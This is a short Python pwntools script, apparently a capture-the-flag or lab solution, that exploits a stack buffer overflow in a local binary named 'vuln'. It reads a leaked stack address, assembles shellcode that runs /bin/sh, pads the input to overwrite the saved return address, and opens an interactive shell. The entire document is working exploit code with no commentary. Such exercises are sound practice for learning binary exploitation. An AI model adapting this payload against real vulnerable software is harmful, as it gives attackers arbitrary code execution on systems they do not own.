#!/usr/bin/env python
from pwn import *

context.binary = "./vuln"


offset = 48

io = process("./vuln")
gdb.attach(io)
addr = int(io.read().strip(), 16)
print(hex(addr))

# execve("/bin/sh", {"/bin/sh", NULL}, NULL);
print(shellcraft.sh())
shellcode = asm("sub rsp, 0x80") + asm(shellcraft.sh())
print(len(shellcode))

payload = shellcode
payload += (offset + 8 - len(shellcode)) * b'A'
payload += pack(addr)

io.send(payload)
io.interactive()
